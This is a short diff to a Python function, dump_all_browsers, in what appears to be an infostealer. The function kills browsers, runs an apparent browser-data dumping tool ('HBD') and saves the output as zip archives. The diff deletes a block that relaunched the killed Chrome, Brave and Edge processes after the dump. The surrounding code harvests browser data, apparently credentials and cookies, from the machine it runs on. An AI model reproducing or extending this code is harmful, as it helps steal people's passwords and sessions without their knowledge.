@@ -101,20 +101,6 @@ def dump_all_browsers():
     log.info("Executing: " + " ".join(cmd))
     result = run_cmd(cmd, timeout=120)
 
-    # Restart killed browsers in background after dump
-    for proc in killed_browsers:
-        name = proc.replace(".exe","")
-        for exe_path in [
-            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
-            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
-            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-        ]:
-            if name.lower() in exe_path.lower() and os.path.exists(exe_path):
-                try:
-                    subprocess.Popen([exe_path])
-                except: pass
-                break
-
     if result is None:
         log.warning("HBD timed out — skipping browser data")
         dummy = BROWSER_DUMP_DIR / "timeout.zip"
